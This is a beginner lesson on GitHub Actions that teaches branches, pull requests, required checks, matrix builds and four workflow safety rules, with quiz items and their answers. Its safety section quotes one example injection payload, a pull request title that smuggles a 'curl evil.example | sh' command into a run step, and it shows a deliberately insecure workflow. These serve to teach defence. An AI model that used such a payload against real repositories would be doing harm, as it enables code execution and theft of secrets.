---
id: github-actions-pull-requests-and-safety
title: Pull requests, required checks and safe workflows
track: github-actions
order: 2
level: beginner
estimated_minutes: 35
prerequisites: [github-actions-first-workflow]
learning_objectives:
  - Use a branch and a pull request so CI checks a change before it reaches main.
  - Make passing checks a merge requirement.
  - Run the same job across several versions with a matrix.
  - Apply four safety rules — least-privilege permissions, pinned actions, careful secrets and no untrusted input in scripts.
resources:
  - title: GitHub Actions documentation
    url: https://docs.github.com/en/actions
    publisher: GitHub
    type: documentation
    level: all
    official: true
    why: Workflow syntax, events, runners, permissions and security hardening, from GitHub.
    verification: { status: verified, checked_on: 2026-11-25 }
self_check:
  - id: required-checks
    prompt: CI runs on every pull request, but someone merges one with a red cross anyway. What prevents this?
    options:
      - { id: a, text: "Nothing; CI results are informational only" }
      - { id: b, text: "Making the check a required status check in a branch protection rule or ruleset for main, so GitHub blocks merging until it passes" }
      - { id: c, text: "Adding more steps to the workflow" }
    answer: b
    explanation: CI only protects main when passing it is mandatory. Branch protection rules and rulesets can require named checks to pass (and reviews to be approved) before a pull request can be merged.
  - id: injection
    prompt: Why is run with echo "${{ github.event.pull_request.title }}" dangerous?
    options:
      - { id: a, text: "Titles can be very long" }
      - { id: b, text: "Anyone opening a pull request controls the title; GitHub pastes it into the script before the shell runs, so a crafted title becomes shell commands" }
      - { id: c, text: "It prints the title twice" }
    answer: b
    explanation: Expressions in run are substituted into the script text before execution. Passing untrusted values through env makes the shell treat them as data in a variable, never as code.
  - id: permissions
    prompt: What does permissions contents read achieve?
    options:
      - { id: a, text: "It makes the workflow run faster" }
      - { id: b, text: "It limits the automatic GITHUB_TOKEN to reading the repository, so a compromised step cannot push code or change settings" }
      - { id: c, text: "It hides the repository from the public" }
    answer: b
    explanation: Every job gets a GITHUB_TOKEN. Declaring the minimum permissions it needs is least privilege applied to CI — the same principle as read-only mounts in the Docker track.
  - id: pin-sha
    prompt: What is the strongest way to pin a third-party action?
    options:
      - { id: a, text: "@main" }
      - { id: b, text: "A version tag such as @v7, which is convenient but can be moved by the action's owner" }
      - { id: c, text: "A full 40-character commit SHA, which always refers to exactly the same code" }
    answer: c
    explanation: Tags can be moved to different code, deliberately or by an attacker who compromises the action's repository. A full commit SHA cannot. Many teams pin SHAs (with the version in a comment) and let Dependabot propose updates.
verification:
  method: executed
  details: The local commands — the check script, Git commits, branches and pushes to the practice remote from the Git lessons — run in the test suite and their output is compared with this lesson. Every workflow file shown or created here is validated by DevForge's workflow checker. How the workflows behave on GitHub was checked against GitHub Docs and the actions' release notes (2026-11-25), but is not run, because it needs github.com.
owner: content-team
last_reviewed: 2026-11-25
content_version: 1
---

## The idea in one sentence

Work happens on **branches**; a **pull request** proposes merging a branch into `main`, CI checks it automatically, and a **required check** makes passing CI a condition for merging.

## Explain it like I'm twelve

Before a class newsletter is printed, each article is handed to the editor on a separate draft sheet. A checker reads every draft for the basics, and the editor will only paste drafts with a "checked" stamp into the final newsletter. Nobody writes directly on the master copy.

Where the analogy breaks: GitHub can enforce the stamp rule itself — the merge button simply stays locked until the checks pass.

## What problem it solves

If everyone pushes straight to `main`, a broken change reaches everyone before anyone notices. Pull requests give each change a place for automated checks and human review *before* it is merged. And because workflows run with access to your repository and secrets, a careless workflow can itself become a security hole; a few rules close the most common ones.

## How it works

```text
 main ──●──────────────────────────────●── (merge)
         \                            /
 improve-readme ●── push ──▶ pull request ── CI ✓ ── review ✓ ── merge
                                          └─ required checks must pass
```

## Try it yourself

> **Local lab, then GitHub** — continue in `student-notes`. The local steps are run automatically in DevForge's tests; the pull-request steps happen on github.com.

### 1. Work on a branch

```bash run
git switch -c improve-readme
echo "Notes from the DevForge 18 lessons." >> README.md
bash scripts/check-notes.sh
git commit -am "Describe the notes in the README"
```

```text output
Switched to a new branch 'improve-readme'
PASS: README.md has a title
[improve-readme a0eb38e] Describe the notes in the README
 1 file changed, 1 insertion(+)
```

`git switch -c` creates a branch and moves to it. Running the check locally first saves a round trip to CI.

### 2. Push the branch

```bash run
git push -u origin improve-readme
```

```text output
To ../class-remote.git
 * [new branch]      improve-readme -> improve-readme
branch 'improve-readme' set up to track 'origin/improve-readme'.
```

On GitHub, the push offers a **Compare & pull request** button. Open the pull request: the *Check notes* workflow runs because it listens for `pull_request`, and its result appears in the pull request's checks section.

### 3. Require the check before merging

In the repository's **Settings**, add a branch protection rule or a ruleset for `main` that requires status checks to pass, and choose the **check** job. From then on, GitHub disables merging until the check is green. Many teams also require at least one approving review.

### 4. Merge

On GitHub you would select **Merge pull request**. Locally, the same result looks like this:

```bash run
git switch main
git merge improve-readme
```

```text output
Switched to branch 'main'
Your branch is up to date with 'origin/main'.
Updating cc28f0c..a0eb38e
Fast-forward
 README.md | 1 +
 1 file changed, 1 insertion(+)
```

Because `main` had not moved, Git simply moved it forward to include the branch (*fast-forward*).

### 5. One job, several versions: a matrix

A matrix runs the same job once per value — here on two Node.js versions — which catches "works on my version only" bugs:

```yaml workflow
name: Test on several Node.js versions

on: [pull_request]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [22, 24]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
```

### 6. Four safety rules

This workflow looks harmless but breaks every rule. DevForge's workflow checker, which validates every workflow in these lessons, rejects it:

```yaml workflow invalid
name: Greet pull requests

on: [pull_request]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: some-user/greeter@main
      - run: echo "Thanks for opening ${{ github.event.pull_request.title }}"
```

1. **Least privilege.** No `permissions` means the token gets the repository's default permissions, which may include write access. Declare only what the job needs.
2. **Pin actions.** `@main` runs whatever the action's author pushes next. Pin a release, or a full commit SHA for third-party actions. Dependabot can open pull requests to update pinned actions.
3. **Never put untrusted input inside `run`.** Expressions are pasted into the script *before* the shell runs it, so a pull request titled `"; curl evil.example | sh; echo "` becomes shell commands. Pass such values through `env`, where the shell treats them as data.
4. **Handle secrets deliberately.** Store them in the repository's encrypted secrets, pass them only to the steps that need them (`env: TOKEN: ${{ secrets.DEPLOY_TOKEN }}`), never print them, and be very careful with `pull_request_target`, which runs with secrets in the context of the base repository. Recent `actions/checkout` releases (v7) refuse to check out a fork's code in that situation by default, because it is a well-known way to leak secrets.

The safe version passes the checker:

```yaml workflow
name: Greet pull requests

on: [pull_request]

permissions:
  contents: read

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Print the title safely
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Thanks for opening $TITLE"
```

## Common mistakes

- **Running CI but not requiring it.** A red cross that does not block merging is easy to ignore.
- **Long-lived branches.** The longer a branch lives, the more it diverges from `main` and the harder the merge; keep pull requests small.
- **Workflow-wide write permissions** because one job needs them. Grant extra permissions to that job only.
- **Copying workflows from the internet without reading them.** They run with your token and secrets.
- **Ignoring Dependabot updates for actions.** Pinned versions need updating, especially for security fixes.

## Where this fits in a real system

Branches, pull requests and required checks are the core of team delivery: the work item in **Jira** links to the pull request, CI runs tests and builds a **Docker** image, reviewers approve, and merging to `main` can trigger a deployment. Case study — DevForge's own `.github/workflows/ci.yml`: it declares `permissions: contents: read`, cancels superseded runs with `concurrency`, starts PostgreSQL and Redis as services for the lesson tests, pins `actions/checkout@v7` and `actions/setup-node@v6`, and passes DevForge's workflow checker. **Jenkins** offers the same gatekeeping for teams that run their own CI servers.
